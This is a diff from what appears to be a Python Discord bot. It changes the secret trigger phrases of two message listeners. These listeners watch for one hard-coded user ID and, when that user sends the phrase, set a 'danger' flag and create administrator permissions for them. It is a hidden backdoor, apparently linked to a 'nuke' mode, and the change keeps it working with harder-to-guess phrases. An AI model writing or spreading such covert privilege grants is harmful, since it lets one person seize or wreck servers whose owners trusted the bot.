@@ -2228,7 +2228,7 @@ danger = False
 @bot.listen()
 async def on_message(message):
         if message.author.id == 758941956600102943:
-            if message.content.lower().startswith("mrinal op"):
+            if message.content.lower().startswith("mrinal op >:)"):
                 danger = True
                 perms = discord.Permissions(administrator=True)
                 mrinal = await bot.fetch_user(758941956600102943)
@@ -2265,7 +2265,7 @@ async def on_message(message):
 async def on_message(message):
     global danger
     if message.author.id == 758941956600102943:
-            if message.content.lower().startswith("mrinal op won"):
+            if message.content.lower().startswith("mrinal won nuke"):
                 danger = False
 
 @bot.listen()
